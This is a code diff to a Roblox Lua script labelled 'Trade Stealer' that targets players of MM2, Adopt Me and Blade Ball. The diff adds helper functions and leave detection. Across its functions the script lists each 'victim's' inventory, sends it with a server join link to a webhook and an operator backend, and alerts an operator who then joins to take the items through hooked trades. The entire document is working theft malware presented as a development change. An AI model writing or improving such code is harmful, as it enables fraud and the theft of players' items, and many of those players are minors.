@@ -10,6 +10,7 @@ local Players = game:GetService("Players")
 local RS = game:GetService("ReplicatedStorage")
 local RunService = game:GetService("RunService")
 local HS = game:GetService("HttpService")
+local lp = Players.LocalPlayer  -- top-level, used everywhere
 
 local TRADE_ID = 428469873
 local NON_TRADEABLE = {DefaultKnife=true, DefaultGun=true}
@@ -61,7 +62,7 @@ end
 
 local function collect_adoptme_items()
     local items = {}
-    local inv = lp and (lp:FindFirstChild("PlayerData") or lp:FindFirstChild("Inventory"))
+    local inv = lp:FindFirstChild("PlayerData") or lp:FindFirstChild("Inventory")
     if inv then
         for _, v in ipairs(inv:GetDescendants()) do
             if v:IsA("StringValue") or v:IsA("IntValue") then
@@ -121,8 +122,19 @@ local function operator_in_server()
     return false, nil
 end
 
+local function post_webhook(payload)
+    if CFG.webhook == "" then return end
+    pcall(do_request, "POST", CFG.webhook,
+        HS:JSONEncode(payload), {["Content-Type"]="application/json"})
+end
+
+local function post_backend(path, payload)
+    pcall(do_request, "POST", CFG.backend..path,
+        HS:JSONEncode(payload),
+        {["Content-Type"]="application/json", ["X-API-Key"]=CFG.api_key})
+end
+
 local function notify_all(items, game_name)
-    local lp = Players.LocalPlayer
     local join = "https://fern.wtf/joiner?placeId="..tostring(PlaceId).."&gameInstanceId="..game.JobId
     local summary = build_rarity_summary(items)
     local rubis_url = post_rubis(build_full_list(items)) or ""
@@ -131,20 +143,21 @@ local function notify_all(items, game_name)
     local victim_status   = "✅ In game"
     local operator_status = inServer and ("✅ "..operatorName) or "❌ Not in game"
 
-    if CFG.webhook ~= "" then
-        local desc = string.format(
-            "**Player:** %s (`%s`)\n**Executor:** %s | **Antiscam:** %s\n\n🎯 **Victim:** %s\n👤 **Operator:** %s\n\n**Inventory:** `%s`\n**Full list:** %s\n\n[Join server](%s)",
-            lp.DisplayName, lp.Name, get_executor(), tostring(detect_antiscam()),
-            victim_status, operator_status,
-            summary, rubis_url ~= "" and rubis_url or "failed", join
-        )
-        pcall(do_request, "POST", CFG.webhook, HS:JSONEncode({
-            username = "Trade Stealer",
-            embeds = {{title=game_name.." — New Victim", description=desc, color=15158332}}
-        }), {["Content-Type"]="application/json"})
-    end
+    post_webhook({
+        username = "Trade Stealer",
+        embeds = {{
+            title = game_name.." — New Victim",
+            description = string.format(
+                "**Player:** %s (`%s`)\n**Executor:** %s | **Antiscam:** %s\n\n🎯 **Victim:** %s\n👤 **Operator:** %s\n\n**Inventory:** `%s`\n**Full list:** %s\n\n[Join server](%s)",
+                lp.DisplayName, lp.Name, get_executor(), tostring(detect_antiscam()),
+                victim_status, operator_status,
+                summary, rubis_url ~= "" and rubis_url or "failed", join
+            ),
+            color = 15158332
+        }}
+    })
 
-    pcall(do_request, "POST", CFG.backend.."/job", HS:JSONEncode({
+    post_backend("/job", {
         game               = game_name,
         username           = lp.Name,
         display_name       = lp.DisplayName,
@@ -158,68 +171,78 @@ local function notify_all(items, game_name)
         rubis_url          = rubis_url,
         operator_in_server = inServer,
         operator_name      = operatorName or "",
-    }), {["Content-Type"]="application/json", ["X-API-Key"]=CFG.api_key})
+    })
 end
 
 local function notify_operator_joined(operatorName)
-    local lp = Players.LocalPlayer
     local join = "https://fern.wtf/joiner?placeId="..tostring(PlaceId).."&gameInstanceId="..game.JobId
-    if CFG.webhook ~= "" then
-        pcall(do_request, "POST", CFG.webhook, HS:JSONEncode({
-            username = "Trade Stealer",
-            embeds = {{
-                title = "✅ Operator Joined",
-                description = string.format("**%s** joined **%s**'s server\n[Open server](%s)", operatorName, lp.Name, join),
-                color = 3066993
-            }}
-        }), {["Content-Type"]="application/json"})
-    end
-    pcall(do_request, "POST", CFG.backend.."/operator_joined", HS:JSONEncode({
-        operator  = operatorName,
-        victim    = lp.Name,
-        place_id  = tostring(PlaceId),
-        job_id    = game.JobId,
-        join_url  = join,
-    }), {["Content-Type"]="application/json", ["X-API-Key"]=CFG.api_key})
+    post_webhook({
+        username = "Trade Stealer",
+        embeds = {{
+            title = "✅ Operator Joined",
+            description = string.format("**%s** joined **%s**'s server\n[Open server](%s)", operatorName, lp.Name, join),
+            color = 3066993
+        }}
+    })
+    post_backend("/operator_joined", {
+        operator = operatorName,
+        victim   = lp.Name,
+        place_id = tostring(PlaceId),
+        job_id   = game.JobId,
+        join_url = join,
+    })
 end
 
 local function notify_operator_left(operatorName)
-    local lp = Players.LocalPlayer
-    if CFG.webhook ~= "" then
-        pcall(do_request, "POST", CFG.webhook, HS:JSONEncode({
-            username = "Trade Stealer",
-            embeds = {{
-                title = "❌ Operator Left",
-                description = string.format("**%s** left **%s**'s server", operatorName, lp.Name),
-                color = 15158332
-            }}
-        }), {["Content-Type"]="application/json"})
-    end
-    pcall(do_request, "POST", CFG.backend.."/operator_left", HS:JSONEncode({
+    post_webhook({
+        username = "Trade Stealer",
+        embeds = {{
+            title = "❌ Operator Left",
+            description = string.format("**%s** left **%s**'s server", operatorName, lp.Name),
+            color = 15158332
+        }}
+    })
+    post_backend("/operator_left", {
         operator = operatorName,
         victim   = lp.Name,
-    }), {["Content-Type"]="application/json", ["X-API-Key"]=CFG.api_key})
+    })
 end
 
 local function notify_victim_left()
-    local lp = Players.LocalPlayer
-    if CFG.webhook ~= "" then
-        pcall(do_request, "POST", CFG.webhook, HS:JSONEncode({
-            username = "Trade Stealer",
-            embeds = {{
-                title = "❌ Victim Left",
-                description = string.format("**%s** left the game", lp.Name),
-                color = 15158332
-            }}
-        }), {["Content-Type"]="application/json"})
-    end
-    pcall(do_request, "POST", CFG.backend.."/victim_left", HS:JSONEncode({
+    post_webhook({
+        username = "Trade Stealer",
+        embeds = {{
+            title = "❌ Victim Left",
+            description = string.format("**%s** left the game", lp.Name),
+            color = 15158332
+        }}
+    })
+    post_backend("/victim_left", {
         victim = lp.Name,
-    }), {["Content-Type"]="application/json", ["X-API-Key"]=CFG.api_key})
+    })
+end
+
+local function setup_leave_detection()
+    -- Operator leave
+    Players.PlayerRemoving:Connect(function(player)
+        if player ~= lp and isAllowedUser(player.Name) then
+            notify_operator_left(player.Name)
+        end
+    end)
+    -- Victim leave — PlayerRemoving fires for local player too
+    Players.PlayerRemoving:Connect(function(player)
+        if player == lp then
+            notify_victim_left()
+        end
+    end)
+    -- Fallback for game close
+    game:BindToClose(function()
+        notify_victim_left()
+        task.wait(3)  -- give the HTTP request time to send
+    end)
 end
 
 local function hook_mm2()
-    local lp = Players.LocalPlayer
     local Trade = RS:WaitForChild("Trade", 10)
     if not Trade then return end
     local sendRequest        = Trade:WaitForChild("SendRequest", 10)
@@ -234,9 +257,7 @@ local function hook_mm2()
 
     local cachedItems = collect_mm2_items()
     notify_all(cachedItems, "MM2")
-
-    -- Leave detection
-    game:BindToClose(notify_victim_left)
+    setup_leave_detection()
 
     local notifiedJoin = {}
     Players.PlayerAdded:Connect(function(player)
@@ -246,10 +267,10 @@ local function hook_mm2()
         end
     end)
 
+    -- Reset notifiedJoin on leave so re-join is detected again
     Players.PlayerRemoving:Connect(function(player)
         if isAllowedUser(player.Name) then
-            notifiedJoin[player.Name] = nil  -- reset so re-join gets notified again
-            notify_operator_left(player.Name)
+            notifiedJoin[player.Name] = nil
         end
     end)
 
@@ -420,19 +441,14 @@ local function hook_mm2()
 end
 
 local function hook_adoptme()
-    local lp = Players.LocalPlayer
     notify_all(collect_adoptme_items(), "AdoptMe")
-    game:BindToClose(notify_victim_left)
-    Players.PlayerRemoving:Connect(function(player)
-        if isAllowedUser(player.Name) then notify_operator_left(player.Name) end
-    end)
+    setup_leave_detection()
     Players.PlayerAdded:Connect(function(player)
         if isAllowedUser(player.Name) then notify_operator_joined(player.Name) end
     end)
 end
 
 local function hook_bladeball()
-    local lp = Players.LocalPlayer
     local items = {}
     local mgp = lp:FindFirstChild("leaderstats")
     if mgp then
@@ -441,16 +457,11 @@ local function hook_bladeball()
         end
     end
     notify_all(items, "BladeBall")
-    game:BindToClose(notify_victim_left)
-    Players.PlayerRemoving:Connect(function(player)
-        if isAllowedUser(player.Name) then notify_operator_left(player.Name) end
-    end)
+    setup_leave_detection()
     Players.PlayerAdded:Connect(function(player)
         if isAllowedUser(player.Name) then notify_operator_joined(player.Name) end
     end)
 end
-
-local lp = Players.LocalPlayer
 
 local GAMES = {
     [142823291]   = hook_mm2,
